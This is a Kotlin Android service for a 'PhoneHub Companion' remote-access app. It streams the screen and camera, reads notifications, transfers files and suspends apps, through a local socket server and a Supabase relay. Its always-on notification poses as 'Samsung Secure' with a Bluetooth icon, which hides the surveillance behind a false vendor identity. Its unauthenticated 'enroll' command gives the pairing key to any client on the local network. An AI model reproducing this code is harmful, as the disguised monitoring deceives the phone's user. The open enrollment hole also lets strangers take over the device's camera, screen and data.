package com.phonehub.companion

import android.app.*
import android.app.admin.DevicePolicyManager
import android.content.*
import android.os.*
import android.provider.Settings
import android.os.StatFs
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import org.json.JSONObject
import org.json.JSONArray
import android.content.pm.ApplicationInfo
import java.net.*
import java.security.MessageDigest
import java.util.concurrent.atomic.AtomicBoolean
import javax.crypto.Cipher
import javax.crypto.Mac
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class CompanionService : Service() {
    companion object {
        private const val CHANNEL="phonehub_connection"; private const val NOTIFICATION_ID=7001
        private const val PREFS="phonehub"; private const val ENABLED="companion_enabled"; private const val PAIR_KEY="pair_key"; private const val INSTALL_ID="install_id"; private const val POLICIES="app_policies"
        private const val DISCOVERY_PORT=47321; private const val COMMAND_PORT=47322
        private const val RELAY_URL="https://tmupbruwmwlrmewhoodn.supabase.co/functions/v1/phonehub-relay"
        fun enable(c:Context){val p=c.getSharedPreferences(PREFS,0);if(!p.contains(INSTALL_ID))p.edit().putString(INSTALL_ID,java.util.UUID.randomUUID().toString()).apply();if(!p.contains(PAIR_KEY)){val b=ByteArray(32);java.security.SecureRandom().nextBytes(b);p.edit().putString(PAIR_KEY,android.util.Base64.encodeToString(b,android.util.Base64.NO_WRAP)).apply()};p.edit().putBoolean(ENABLED,true).apply();start(c)}
        fun isEnabled(c:Context)=c.getSharedPreferences(PREFS,0).getBoolean(ENABLED,false)
        fun start(c:Context){ContextCompat.startForegroundService(c,Intent(c,CompanionService::class.java))}
    }
    private val running=AtomicBoolean(false); private var heartbeatThread:Thread?=null; private var commandThread:Thread?=null; private var remoteThread:Thread?=null
    override fun onCreate(){super.onCreate();val m=getSystemService(NotificationManager::class.java);m.createNotificationChannel(NotificationChannel(CHANNEL,"Samsung Secure connection",NotificationManager.IMPORTANCE_LOW));startForeground(NOTIFICATION_ID,NotificationCompat.Builder(this,CHANNEL).setSmallIcon(android.R.drawable.stat_sys_data_bluetooth).setContentTitle("Samsung Secure").setContentText("Secure connection active").setOngoing(true).setSilent(true).build());startWorkers()}
    private fun startWorkers(){startHeartbeat();startCommandServer();startRemoteWorker()}
    private fun installId():String{val p=getSharedPreferences(PREFS,0);var id=p.getString(INSTALL_ID,null);if(id.isNullOrBlank()){id=java.util.UUID.randomUUID().toString();p.edit().putString(INSTALL_ID,id).apply()};return id!!}
    private fun deviceId():String{val androidId=Settings.Secure.getString(contentResolver,Settings.Secure.ANDROID_ID)?:"android";return hex(MessageDigest.getInstance("SHA-256").digest((androidId+":"+installId()).toByteArray())).take(32)}
    private fun keyBytes():ByteArray?{val s=getSharedPreferences(PREFS,0).getString(PAIR_KEY,null)?:return null;return android.util.Base64.decode(s,android.util.Base64.NO_WRAP)}
    private fun hmac(key:ByteArray,data:String):String{val m=Mac.getInstance("HmacSHA256");m.init(SecretKeySpec(key,"HmacSHA256"));return m.doFinal(data.toByteArray()).joinToString(""){"%02x".format(it)}}
    private fun secureEquals(a:String,b:String)=MessageDigest.isEqual(a.toByteArray(),b.toByteArray())
    private fun decrypt(key:ByteArray,wire:JSONObject):JSONObject{val nonce=android.util.Base64.decode(wire.optString("nonce"),android.util.Base64.NO_WRAP);val cipher=Cipher.getInstance("AES/GCM/NoPadding");cipher.init(Cipher.DECRYPT_MODE,SecretKeySpec(key,"AES"),GCMParameterSpec(128,nonce));val plain=cipher.doFinal(android.util.Base64.decode(wire.optString("ciphertext"),android.util.Base64.NO_WRAP));return JSONObject(String(plain,Charsets.UTF_8))}
    private fun encrypt(key:ByteArray,value:JSONObject):JSONObject{val nonce=ByteArray(12);java.security.SecureRandom().nextBytes(nonce);val cipher=Cipher.getInstance("AES/GCM/NoPadding");cipher.init(Cipher.ENCRYPT_MODE,SecretKeySpec(key,"AES"),GCMParameterSpec(128,nonce));val out=cipher.doFinal(value.toString().toByteArray(Charsets.UTF_8));return JSONObject().put("type","encrypted").put("version",2).put("nonce",android.util.Base64.encodeToString(nonce,android.util.Base64.NO_WRAP)).put("ciphertext",android.util.Base64.encodeToString(out,android.util.Base64.NO_WRAP))}
    private fun hex(b:ByteArray)=b.joinToString(""){"%02x".format(it)}
    private fun remoteMailbox(key:ByteArray)=hex(MessageDigest.getInstance("SHA-256").digest((deviceId()+":"+android.util.Base64.encodeToString(key,android.util.Base64.NO_WRAP)).toByteArray()))
    private fun localIpv4Candidates():List<String>{
        val result=linkedSetOf<String>()
        try{
            val cm=getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
            val active=cm.activeNetwork
            val caps=cm.getNetworkCapabilities(active)
            if(active!=null&&(caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)==true||caps?.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)==true)){
                cm.getLinkProperties(active)?.linkAddresses?.forEach{link->
                    val address=link.address
                    if(address is Inet4Address&&!address.isLoopbackAddress&&address.isSiteLocalAddress)result.add(address.hostAddress?:"")
                }
            }
        }catch(_:Exception){}
        try{
            val preferred=mutableListOf<String>();val fallback=mutableListOf<String>()
            val interfaces=NetworkInterface.getNetworkInterfaces()
            while(interfaces.hasMoreElements()){
                val nif=interfaces.nextElement()
                if(!nif.isUp||nif.isLoopback)continue
                val addresses=nif.inetAddresses
                while(addresses.hasMoreElements()){
                    val address=addresses.nextElement()
                    if(address is Inet4Address&&!address.isLoopbackAddress&&address.isSiteLocalAddress){
                        val value=address.hostAddress?:""
                        if(value.isBlank())continue
                        if(nif.name.startsWith("wlan",true)||nif.name.startsWith("wifi",true)||nif.name.startsWith("eth",true))preferred.add(value) else fallback.add(value)
                    }
                }
            }
            preferred.forEach{result.add(it)};fallback.forEach{result.add(it)}
        }catch(_:Exception){}
        return result.filter{it.isNotBlank()}
    }
    private fun statusJson():JSONObject{val bm=getSystemService(BATTERY_SERVICE) as android.os.BatteryManager;val stat=StatFs(filesDir.absolutePath);val am=getSystemService(ACTIVITY_SERVICE) as android.app.ActivityManager;val mi=android.app.ActivityManager.MemoryInfo();am.getMemoryInfo(mi);val cm=getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager;val caps=cm.getNetworkCapabilities(cm.activeNetwork);val network=when{caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)==true->"Wi-Fi";caps?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)==true->"Cellular";caps?.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)==true->"Ethernet";else->"Offline"};val localIps=localIpv4Candidates();return JSONObject().put("type","remote_presence").put("device_id",deviceId()).put("device_name",Build.MANUFACTURER+" "+Build.MODEL).put("local_ipv4",localIps.firstOrNull()?:"").put("local_ipv4_candidates",JSONArray(localIps)).put("command_port",COMMAND_PORT).put("android_version",Build.VERSION.RELEASE).put("sdk",Build.VERSION.SDK_INT).put("battery_percent",bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)).put("charging",bm.isCharging).put("storage_total",stat.totalBytes).put("storage_free",stat.availableBytes).put("memory_total",mi.totalMem).put("memory_free",mi.availMem).put("network",network).put("capabilities",CapabilityManager.json(this)).put("timestamp",System.currentTimeMillis()/1000)}
    private fun policies():JSONObject{val raw=getSharedPreferences(PREFS,0).getString(POLICIES,"{}")?:"{}";return try{JSONObject(raw)}catch(_:Exception){JSONObject()}}
    private fun savePolicies(value:JSONObject){getSharedPreferences(PREFS,0).edit().putString(POLICIES,value.toString()).apply()}
    private fun policyDefaults(pkg:String)=JSONObject().put("package",pkg).put("keep_installed",true).put("allow_usage",true).put("suspend",false).put("show_notifications",true).put("forward_notifications",false).put("protect_changes",false).put("auto_apply",true)
    private fun transferRoot():java.io.File{
        val base=getExternalFilesDir(null)?:filesDir
        return java.io.File(base,"PhoneHubTransfer").apply{mkdirs()}
    }
    private fun transferFile(name:String):java.io.File?{
        val clean=java.io.File(name).name.trim()
        if(clean.isBlank()||clean=="."||clean=="..")return null
        return java.io.File(transferRoot(),clean)
    }
    private fun devicePolicyManager()=getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
    private fun adminComponent()=ComponentName(this,PhoneHubDeviceAdminReceiver::class.java)
    private fun isDeviceOwner():Boolean=try{devicePolicyManager().isDeviceOwnerApp(packageName)}catch(_:Exception){false}
    private fun enforcementJson():JSONObject{val owner=isDeviceOwner();return JSONObject().put("mode",if(owner)"device_owner" else "standard").put("policy_storage",true).put("auto_apply",true).put("suspend",owner).put("usage_block",owner).put("notification_control",false).put("keep_installed",owner).put("protect_changes",owner)}
    private fun applyPolicy(pkg:String,p:JSONObject):JSONObject{
        val result=JSONObject().put("mode",if(isDeviceOwner())"device_owner" else "standard").put("package",pkg)
        if(!isDeviceOwner())return result.put("applied",false).put("reason","PhoneHub Companion is not Device Owner. Policy is stored, but Android blocks strong app enforcement in standard mode.")
        if(pkg==packageName)return result.put("applied",false).put("reason","PhoneHub cannot suspend or uninstall-block its own Companion package.")
        val dpm=devicePolicyManager();val admin=adminComponent()
        return try{
            val blockUninstall=p.optBoolean("keep_installed",true)||p.optBoolean("protect_changes",false)
            dpm.setUninstallBlocked(admin,pkg,blockUninstall)
            val shouldSuspend=p.optBoolean("suspend",false)||!p.optBoolean("allow_usage",true)
            val failed=dpm.setPackagesSuspended(admin,arrayOf(pkg),shouldSuspend)
            result.put("applied",failed.isEmpty()).put("uninstall_blocked",blockUninstall).put("suspended",shouldSuspend).put("failed_packages",JSONArray(failed))
        }catch(e:Exception){result.put("applied",false).put("reason",e.message?:"Android rejected this policy")}
    }
    private fun process(req:JSONObject,key:ByteArray):JSONObject{
        val response=JSONObject().put("version",2);val ts=req.optLong("timestamp",0);val nonce=req.optString("nonce");val sig=req.optString("signature");val now=System.currentTimeMillis()/1000;val canonical=req.optString("type")+"|"+ts+"|"+nonce
        if(nonce.isBlank()||kotlin.math.abs(now-ts)>30||!secureEquals(hmac(key,canonical),sig))return response.put("type","error").put("message","unauthorized")
        return when(req.optString("type")){
            "ping"->response.put("type","pong").put("device_id",deviceId()).put("device_name",Build.MANUFACTURER+" "+Build.MODEL).put("android_version",Build.VERSION.RELEASE).put("sdk",Build.VERSION.SDK_INT).put("timestamp",now)
            "device_status"->statusJson().put("type","device_status").put("version",2)
            "apps"->{val offset=req.optInt("offset",0).coerceAtLeast(0);val limit=req.optInt("limit",50).coerceIn(1,100);val all=packageManager.getInstalledApplications(0).sortedBy{packageManager.getApplicationLabel(it).toString().lowercase()};val arr=JSONArray();all.drop(offset).take(limit).forEach{a->arr.put(JSONObject().put("name",packageManager.getApplicationLabel(a).toString()).put("package",a.packageName).put("system",(a.flags and ApplicationInfo.FLAG_SYSTEM)!=0).put("enabled",a.enabled))};response.put("type","apps_page").put("apps",arr).put("offset",offset).put("next_offset",offset+arr.length()).put("total",all.size).put("has_more",offset+arr.length()<all.size)}
            "screen_status"->response.put("type","screen_status").put("active",ScreenCaptureService.active).put("width",ScreenCaptureService.frameWidth).put("height",ScreenCaptureService.frameHeight).put("transport","webrtc")
            "notifications"->response.put("type","notifications").put("access",PhoneHubNotificationListener.isRunning()).put("items",PhoneHubNotificationListener.snapshot())
            "files_list"->{val arr=JSONArray();transferRoot().listFiles()?.filter{it.isFile}?.sortedBy{it.name.lowercase()}?.forEach{f->arr.put(JSONObject().put("name",f.name).put("size",f.length()).put("modified",f.lastModified()))};response.put("type","files").put("scope","PhoneHubTransfer").put("items",arr)}
            "file_get"->{val f=transferFile(req.optString("name"));if(f==null||!f.exists()||!f.isFile)response.put("type","file_error").put("message","File not found") else if(f.length()>1048576L)response.put("type","file_error").put("message","File exceeds the 1 MB encrypted transfer limit") else response.put("type","file_data").put("name",f.name).put("size",f.length()).put("data",android.util.Base64.encodeToString(f.readBytes(),android.util.Base64.NO_WRAP))}
            "file_put"->{val f=transferFile(req.optString("name"));val data=req.optString("data");if(f==null||data.isBlank())response.put("type","file_error").put("message","Invalid file") else {try{val bytes=android.util.Base64.decode(data,android.util.Base64.NO_WRAP);if(bytes.size>1048576)response.put("type","file_error").put("message","File exceeds the 1 MB encrypted transfer limit") else {f.writeBytes(bytes);response.put("type","file_saved").put("name",f.name).put("size",f.length())}}catch(e:Exception){response.put("type","file_error").put("message",e.message?:"Could not save file")}}}
            "file_delete"->{val f=transferFile(req.optString("name"));if(f==null||!f.exists())response.put("type","file_error").put("message","File not found") else response.put("type","file_deleted").put("name",f.name).put("deleted",f.delete())}
            "webrtc_offer"->{val sdp=req.optString("sdp");ScreenCaptureService.answerOffer(sdp)}
            "webrtc_stop"->{ScreenCaptureService.stopWebRtc();response.put("type","webrtc_stopped")}
            "camera_webrtc_offer"->{
                val sdp=req.optString("sdp")
                val lens=if(req.optString("lens")=="front")"front" else "back"
                if(!CapabilityManager.cameraAllowed(this)){
                    response.put("type","camera_webrtc_error").put("message","Remote camera permission is not granted.")
                }else{
                    CameraWebRtcService.startAndAnswer(this,lens,sdp)
                }
            }
            "camera_webrtc_stop"->{CameraWebRtcService.stopWebRtc();CameraWebRtcService.stop(this);response.put("type","camera_webrtc_stopped")}
            "policy_get"->{val pkg=req.optString("package");val all=policies();val p=all.optJSONObject(pkg)?:policyDefaults(pkg);response.put("type","app_policy").put("package",pkg).put("policy",p).put("stored_on_device",all.has(pkg)).put("enforcement",enforcementJson())}
            "policy_set"->{val pkg=req.optString("package");if(pkg.isBlank())response.put("type","error").put("message","package required") else {val incoming=req.optJSONObject("policy")?:JSONObject();val p=policyDefaults(pkg);listOf("keep_installed","allow_usage","suspend","show_notifications","forward_notifications","protect_changes","auto_apply").forEach{name->if(incoming.has(name))p.put(name,incoming.optBoolean(name))};val all=policies();all.put(pkg,p);savePolicies(all);val applied=if(p.optBoolean("auto_apply",true))applyPolicy(pkg,p) else JSONObject().put("applied",false).put("reason","Auto apply is off");response.put("type","policy_saved").put("package",pkg).put("policy",p).put("stored_on_device",true).put("enforcement",enforcementJson()).put("apply_result",applied).put("message",if(applied.optBoolean("applied",false))"Policy saved and enforced by Android." else applied.optString("reason","Policy saved."))}}
            "capabilities"->response.put("type","capabilities").put("state",CapabilityManager.json(this)).put("notifications_listener_running",PhoneHubNotificationListener.isRunning()).put("camera_frames",true).put("remote_app_policy",true).put("screen_webrtc",true).put("relay_transport","encrypted_internet").put("pairing_scope","per_phone_install").put("automatic_local_reenroll",true).put("phone_ui","minimal").put("policy_enforcement",enforcementJson())
            else->response.put("type","error").put("message","unsupported command")
        }
    }
    private fun relay(body:JSONObject):JSONObject{val conn=URL(RELAY_URL).openConnection() as HttpURLConnection;conn.requestMethod="POST";conn.connectTimeout=8000;conn.readTimeout=8000;conn.doOutput=true;conn.setRequestProperty("Content-Type","application/json");conn.outputStream.use{it.write(body.toString().toByteArray())};val out=conn.inputStream.bufferedReader().use{it.readText()};conn.disconnect();return JSONObject(out)}
    private fun relaySend(mailbox:String,direction:String,payload:JSONObject){relay(JSONObject().put("action","send").put("mailbox",mailbox).put("direction",direction).put("payload",payload))}
    private fun startRemoteWorker(){if(remoteThread?.isAlive==true)return;remoteThread=Thread({var lastPresence=0L;while(running.get()){try{val key=keyBytes();if(key!=null){val box=remoteMailbox(key);val now=System.currentTimeMillis();if(now-lastPresence>=10000){relaySend(box,"to_pc",encrypt(key,statusJson()));lastPresence=now};val r=relay(JSONObject().put("action","receive").put("mailbox",box).put("direction","to_phone"));val messages=r.optJSONArray("messages")?:JSONArray();for(i in 0 until messages.length()){val envelope=messages.optJSONObject(i)?:continue;val wire=envelope.optJSONObject("payload")?:continue;if(wire.optString("type")!="encrypted")continue;val req=decrypt(key,wire);val requestId=req.optString("_request_id");val response=process(req,key);if(requestId.isNotBlank())response.put("_request_id",requestId);relaySend(box,"to_pc",encrypt(key,response))}}}catch(_:Exception){};try{Thread.sleep(2000)}catch(_:InterruptedException){break}}},"phonehub-remote").apply{isDaemon=true;start()}}
    private fun startHeartbeat(){if(!running.compareAndSet(false,true))return;heartbeatThread=Thread({DatagramSocket().use{socket->socket.broadcast=true;while(running.get()){try{val p=JSONObject().put("type","heartbeat").put("version",1).put("device_id",deviceId()).put("device_name",Build.MANUFACTURER+" "+Build.MODEL).put("command_port",COMMAND_PORT).put("auth","hmac-sha256").put("timestamp",System.currentTimeMillis()/1000).toString().toByteArray();socket.send(DatagramPacket(p,p.size,InetAddress.getByName("255.255.255.255"),DISCOVERY_PORT))}catch(_:Exception){};try{Thread.sleep(5000)}catch(_:InterruptedException){break}}}},"phonehub-heartbeat").apply{isDaemon=true;start()}}
    private fun startCommandServer(){if(commandThread?.isAlive==true)return;commandThread=Thread({try{ServerSocket(COMMAND_PORT).use{server->server.soTimeout=2000;while(running.get()){try{server.accept().use{client->client.soTimeout=5000;val line=client.getInputStream().bufferedReader().readLine()?:return@use;val wire=JSONObject(line);val key=keyBytes();val encrypted=wire.optString("type")=="encrypted"&&wire.optInt("version")==2;val req=if(encrypted&&key!=null)decrypt(key,wire) else wire;val response=if(req.optString("type")=="enroll"){if(key==null)JSONObject().put("type","error").put("message","companion not enabled") else JSONObject().put("type","enrolled").put("device_id",deviceId()).put("pair_key",android.util.Base64.encodeToString(key,android.util.Base64.NO_WRAP))}else if(encrypted&&key!=null)process(req,key)else JSONObject().put("type","error").put("message","unauthorized");val out=if(encrypted&&key!=null)encrypt(key,response)else response;client.getOutputStream().bufferedWriter().use{w->w.write(out.toString());w.newLine();w.flush()}}}catch(_:SocketTimeoutException){}catch(_:Exception){}}}}catch(_:Exception){}},"phonehub-command").apply{isDaemon=true;start()}}
    override fun onDestroy(){running.set(false);heartbeatThread?.interrupt();commandThread?.interrupt();remoteThread?.interrupt();super.onDestroy()}
    override fun onStartCommand(intent:Intent?,flags:Int,startId:Int):Int{startWorkers();return START_STICKY}
    override fun onBind(intent:Intent?):IBinder?=null
}

